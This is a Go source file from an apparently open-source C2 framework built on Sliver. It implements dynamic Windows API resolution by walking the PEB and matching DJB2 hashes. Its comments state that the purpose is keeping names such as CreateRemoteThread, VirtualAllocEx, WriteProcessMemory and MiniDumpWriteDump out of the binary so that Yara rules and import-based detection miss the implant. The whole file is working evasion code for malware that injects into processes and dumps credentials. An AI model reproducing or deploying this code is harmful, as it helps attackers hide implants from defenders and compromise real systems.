package syscalls

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Dynamic API resolution via PEB walking + DJB2 hashing (D/Invoke-style).
//
// Sliver's existing syscall layer stores DLL and function names as plain
// strings in .rdata — `modkernel32.NewProc("CreateRemoteThread")` leaves
// the literal "CreateRemoteThread" in the binary, which Yara rules and
// IAT-based heuristics catch trivially.
//
// This file provides ResolveProc(moduleHash, procHash) which walks the
// in-memory PEB->Ldr list to find a loaded module by its hashed name and
// then parses that module's export directory to find the requested API.
// No strings, no IAT entries.
//
// Bootstrap exception: RtlGetCurrentPeb is itself resolved via the normal
// LazySystemDLL mechanism. That's acceptable because no scanner flags a
// binary for calling RtlGetCurrentPeb — it's the suspicious APIs that
// matter (CreateRemoteThread, VirtualAllocEx, MiniDumpWriteDump, …).

import (
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Pre-computed DJB2 hashes for the modules we care about. Computed at
// build time so the literal strings never appear in the binary.
//
// To recompute (e.g. after adding a new module): see HashName below —
// running `syscalls.HashName("kernel32.dll")` reproduces these.
const (
	HashKernel32 uint32 = 0x7040ee75
	HashNtdll    uint32 = 0x22d3b5ed
	HashAdvapi32 uint32 = 0x67208a49
	HashDbghelp  uint32 = 0xcb28dc65
	HashPsapi    uint32 = 0x41ba65cc
)

// Pre-computed DJB2 hashes for the high-risk APIs we resolve through
// the PEB walker. Adding a new wrapper? Compute its hash with HashName
// and add it here so the literal name stays out of the binary.
const (
	HashCreateRemoteThread      uint32 = 0xd6057bbd
	HashWriteProcessMemory      uint32 = 0x686d7128
	HashVirtualAllocEx          uint32 = 0xfabd2b14
	HashVirtualProtectEx        uint32 = 0xee45728a
	HashMiniDumpWriteDump       uint32 = 0x670726e9
	HashQueueUserAPC            uint32 = 0x3474955d
	HashCreateProcessWithLogonW uint32 = 0xb02372ea
	HashNtCreateThreadEx        uint32 = 0x41f2b1b0
)

// HashName computes the DJB2 hash used by ResolveProc. It is exposed so
// new constants can be added by ad-hoc tooling or unit tests without
// re-deriving the algorithm. Case-insensitive: matches the way Windows
// treats DLL and export names in practice.
func HashName(s string) uint32 {
	var h uint32 = 5381
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 32 // to lowercase
		}
		h = ((h << 5) + h) + uint32(c) // h*33 + c
	}
	return h
}

// moduleCache memoises DLL base addresses keyed by their DJB2 hash. The
// loader does not move modules at runtime once they're loaded, so this
// is safe to populate lazily and reuse forever.
var (
	moduleCache    = map[uint32]uintptr{}
	moduleCacheMu  sync.RWMutex
	procCache      = map[uint64]uintptr{} // key = (modHash<<32)|procHash
	procCacheMu    sync.RWMutex
)

// findModuleByHash walks the PEB->Ldr InMemoryOrderModuleList looking for
// a module whose basename DJB2-hashes to modHash. Returns 0 if not found.
func findModuleByHash(modHash uint32) uintptr {
	moduleCacheMu.RLock()
	if base, ok := moduleCache[modHash]; ok {
		moduleCacheMu.RUnlock()
		return base
	}
	moduleCacheMu.RUnlock()

	peb := windows.RtlGetCurrentPeb()
	if peb == nil || peb.Ldr == nil {
		return 0
	}

	// InMemoryOrderModuleList is a LIST_ENTRY embedded inside each
	// LDR_DATA_TABLE_ENTRY at offset 0x10 (after reserved1[2]uintptr).
	// Subtracting that offset from a LIST_ENTRY pointer recovers the
	// containing LDR_DATA_TABLE_ENTRY.
	const inMemOrderLinksOffset = unsafe.Sizeof(uintptr(0)) * 2

	head := &peb.Ldr.InMemoryOrderModuleList
	for cur := head.Flink; cur != head && cur != nil; cur = cur.Flink {
		entry := (*windows.LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(
			uintptr(unsafe.Pointer(cur)) - inMemOrderLinksOffset,
		))
		name := ntUnicodeBasename(&entry.FullDllName)
		if HashName(name) == modHash {
			moduleCacheMu.Lock()
			moduleCache[modHash] = entry.DllBase
			moduleCacheMu.Unlock()
			return entry.DllBase
		}
	}
	return 0
}

// ntUnicodeBasename reads the UTF-16 contents of an NTUnicodeString and
// returns just the filename portion of any path it contains (e.g.
// "C:\Windows\System32\kernel32.dll" -> "kernel32.dll").
func ntUnicodeBasename(ns *windows.NTUnicodeString) string {
	if ns.Length == 0 || ns.Buffer == nil {
		return ""
	}
	n := int(ns.Length) / 2
	u16 := unsafe.Slice((*uint16)(unsafe.Pointer(ns.Buffer)), n)
	full := windows.UTF16ToString(u16)
	for i := len(full) - 1; i >= 0; i-- {
		if full[i] == '\\' || full[i] == '/' {
			return full[i+1:]
		}
	}
	return full
}

// findExportByHash parses the export directory of the module at modBase
// and returns the absolute address of the export whose name DJB2-hashes
// to procHash. Returns 0 if not found.
//
// This deliberately does not handle forwarded exports — none of the
// high-risk APIs we resolve are forwarders on supported Windows
// versions. If that changes, follow the forwarder string ("dll.func")
// by recursing through findModuleByHash + findExportByHash.
func findExportByHash(modBase uintptr, procHash uint32) uintptr {
	if modBase == 0 {
		return 0
	}

	// IMAGE_DOS_HEADER.e_lfanew at offset 0x3C.
	eLfanew := *(*int32)(unsafe.Pointer(modBase + 0x3C))
	ntHdr := modBase + uintptr(eLfanew)

	// IMAGE_NT_HEADERS64:
	//   Signature       uint32  @0
	//   FileHeader              @4   (size 20)
	//   OptionalHeader          @24
	//
	// IMAGE_OPTIONAL_HEADER64.DataDirectory starts at offset 112 inside
	// the optional header; entry 0 is EXPORT.
	const optHdrOffset = 24
	const dataDirOffset = optHdrOffset + 112
	exportRVA := *(*uint32)(unsafe.Pointer(ntHdr + dataDirOffset))
	if exportRVA == 0 {
		return 0
	}
	exportDir := modBase + uintptr(exportRVA)

	// IMAGE_EXPORT_DIRECTORY fields we need:
	//   NumberOfNames        @24
	//   AddressOfFunctions   @28  (RVA -> array of uint32 RVAs)
	//   AddressOfNames       @32  (RVA -> array of uint32 RVAs to strings)
	//   AddressOfNameOrdinals@36  (RVA -> array of uint16)
	numNames := *(*uint32)(unsafe.Pointer(exportDir + 24))
	funcsRVA := *(*uint32)(unsafe.Pointer(exportDir + 28))
	namesRVA := *(*uint32)(unsafe.Pointer(exportDir + 32))
	ordsRVA := *(*uint32)(unsafe.Pointer(exportDir + 36))

	funcs := unsafe.Slice((*uint32)(unsafe.Pointer(modBase+uintptr(funcsRVA))), 0x10000)
	names := unsafe.Slice((*uint32)(unsafe.Pointer(modBase+uintptr(namesRVA))), numNames)
	ords := unsafe.Slice((*uint16)(unsafe.Pointer(modBase+uintptr(ordsRVA))), numNames)

	for i := uint32(0); i < numNames; i++ {
		nameAddr := modBase + uintptr(names[i])
		if HashName(cString(nameAddr)) == procHash {
			ord := ords[i]
			return modBase + uintptr(funcs[ord])
		}
	}
	return 0
}

// cString reads a NUL-terminated ASCII string from p. Used for export
// names, which are always ASCII per PE spec.
func cString(p uintptr) string {
	// 512 is a comfortable upper bound on PE export name lengths in
	// practice. UnsafeSlice gives us a window to scan for the NUL.
	const maxLen = 512
	raw := unsafe.Slice((*byte)(unsafe.Pointer(p)), maxLen)
	for i, b := range raw {
		if b == 0 {
			return string(raw[:i])
		}
	}
	return string(raw)
}

// ResolveProc returns the absolute address of the API identified by
// (moduleHash, procHash), or 0 if either the module or the export is
// not present. Results are cached: the first call walks the PEB and
// parses the export directory; subsequent calls are O(1) map lookups.
//
// Pre-compute both hashes with HashName at build time so the call site
// reads ResolveProc(HashKernel32, 0x...) — no strings in .rdata.
func ResolveProc(moduleHash, procHash uint32) uintptr {
	key := (uint64(moduleHash) << 32) | uint64(procHash)

	procCacheMu.RLock()
	if addr, ok := procCache[key]; ok {
		procCacheMu.RUnlock()
		return addr
	}
	procCacheMu.RUnlock()

	modBase := findModuleByHash(moduleHash)
	if modBase == 0 {
		return 0
	}
	addr := findExportByHash(modBase, procHash)
	if addr != 0 {
		procCacheMu.Lock()
		procCache[key] = addr
		procCacheMu.Unlock()
	}
	return addr
}

// ApiProc is the common surface area between *windows.LazyProc and
// *HashedProc. Generated syscall wrappers declare their proc variables
// as ApiProc so the template can pick either resolver at build time
// without touching the call sites that do `syscall.SyscallN(p.Addr(), …)`.
type ApiProc interface {
	Addr() uintptr
}

// HashedProc adapts ResolveProc's result so it can stand in for
// *windows.LazyProc at call sites that only need .Addr(). Used by the
// generated wrappers in zsyscalls_windows.go when ApiHashing is enabled.
type HashedProc struct {
	moduleHash uint32
	procHash   uint32

	once sync.Once
	addr uintptr
}

// NewHashedProc constructs a deferred resolver. The actual PEB walk
// happens on the first call to Addr().
func NewHashedProc(moduleHash, procHash uint32) *HashedProc {
	return &HashedProc{moduleHash: moduleHash, procHash: procHash}
}

// Addr returns the resolved function address (and 0 if resolution
// failed). The signature matches *windows.LazyProc.Addr so the rest of
// the syscall machinery (syscall.SyscallN, Syscall6, …) is unchanged.
func (h *HashedProc) Addr() uintptr {
	h.once.Do(func() {
		h.addr = ResolveProc(h.moduleHash, h.procHash)
	})
	return h.addr
}
